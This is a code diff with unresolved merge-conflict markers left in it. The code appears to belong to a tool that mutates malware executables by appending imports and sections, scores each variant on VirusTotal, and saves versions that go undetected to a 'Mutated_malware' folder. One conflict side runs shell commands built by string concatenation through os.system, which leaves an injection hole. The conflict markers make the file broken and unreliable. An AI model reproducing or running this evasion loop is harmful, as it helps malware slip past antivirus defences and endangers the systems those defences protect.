@@ -72,8 +72,11 @@ def evaluate(pefile):
     previous_score = virus_total_score(pefile)
     print("original score : " + str(previous_score))
 
+<<<<<<< HEAD
     value = 0
 
+=======
+>>>>>>> a069b411327b9f0cc518ba062de6db59c247e4c5
     while(True):
         
         action = random.randint(1,5)
@@ -98,12 +101,15 @@ def evaluate(pefile):
 
         print("score : " + str(score))
 
+<<<<<<< HEAD
         if(score < 40):
             with open("Mutated_malware/queried" + str(value) + ".exe", 'wb') as file1:
                 file1.write(bytez)
         print("file wrote")
         value = value + 1
 
+=======
+>>>>>>> a069b411327b9f0cc518ba062de6db59c247e4c5
         if(score > previous_score):
             bytez = previous_bytez
             outputFile.write("Remove\n") # dont add the previous action
@@ -112,21 +118,36 @@ def evaluate(pefile):
             previous_score = score
             previous_bytez = bytez
         
+<<<<<<< HEAD
     
+=======
+        if(score < 10):
+            with open("Mutated_malware/queried.exe", 'wb') as file1:
+                file1.write(bytez)
+            exit(1)
+>>>>>>> a069b411327b9f0cc518ba062de6db59c247e4c5
 
         
 
    
 def add_imports(pefile, importfile, cpath, outfile):
     cmd = './' + cpath + ' ' + pefile + ' ' + importfile + ' ' + outfile
+<<<<<<< HEAD
     subprocess.call(["./" + cpath , pefile , importfile , outfile])
     #os.system(cmd)
+=======
+    os.system(cmd)
+>>>>>>> a069b411327b9f0cc518ba062de6db59c247e4c5
 
 
 def add_sections(section_app: str, pefile: str, section_file: str, section_content: str, outfile:str):
     cmd = './' + section_app + ' ' + pefile + ' ' + section_file + ' ' + section_content + ' ' + outfile
+<<<<<<< HEAD
     subprocess.call(["./" + section_app , pefile , section_file , section_content, outfile])
     #os.system(cmd)
+=======
+    os.system(cmd)
+>>>>>>> a069b411327b9f0cc518ba062de6db59c247e4c5
 
 
 def __binary_to_bytez(binary, dos_stub=False, imports=False, overlay=False, relocations=False, resources=False, tls=False):
@@ -186,9 +207,15 @@ def imports_append(bytez):
     with open("modified.exe", 'wb') as file1:
         file1.write(bytez)
 
+<<<<<<< HEAD
    
     cmd = " ./portable-executable/project-add-imports/bin/Debug/project-append-import modified.exe imports.txt modified.exe"
     subprocess.call(["./portable-executable/project-add-imports/bin/Debug/project-append-import" , "modified.exe" , "imports.txt" , "modified.exe"])
+=======
+    sys.stdout.flush()
+    cmd = " ./portable-executable/project-add-imports/bin/Debug/project-append-import modified.exe imports.txt modified.exe"
+    os.system(cmd)
+>>>>>>> a069b411327b9f0cc518ba062de6db59c247e4c5
 
     with open("modified.exe", "rb") as binfile:
         bytez = binfile.read()
@@ -203,9 +230,15 @@ def section_add(bytez):
     with open("modified.exe", 'wb') as file1:
         file1.write(bytez)
 
+<<<<<<< HEAD
     
     cmd = "./portable-executable/project-add-sections/bin/Debug/project-append-section modified.exe " + section + " " + section_content + " modified.exe"
     subprocess.call(["./portable-executable/project-add-sections/bin/Debug/project-append-section" , "modified.exe" , section , section_content, "modified.exe"])
+=======
+    sys.stdout.flush()
+    cmd = "./portable-executable/project-add-sections/bin/Debug/project-append-section modified.exe " + section + " " + section_content + " modified.exe"
+    os.system(cmd)
+>>>>>>> a069b411327b9f0cc518ba062de6db59c247e4c5
 
     #print('adding section : ' + section)
 
@@ -284,7 +317,11 @@ def virus_total_score(file):
     files = {'file': ('myfile.exe', open(file, 'rb'))}
     response = requests.post(url, files=files, params=params)
     sha =  response.json()['sha1']
+<<<<<<< HEAD
     print(sha)
+=======
+
+>>>>>>> a069b411327b9f0cc518ba062de6db59c247e4c5
     while(True):
         time.sleep(10)
         url = 'https://www.virustotal.com/vtapi/v2/file/report'
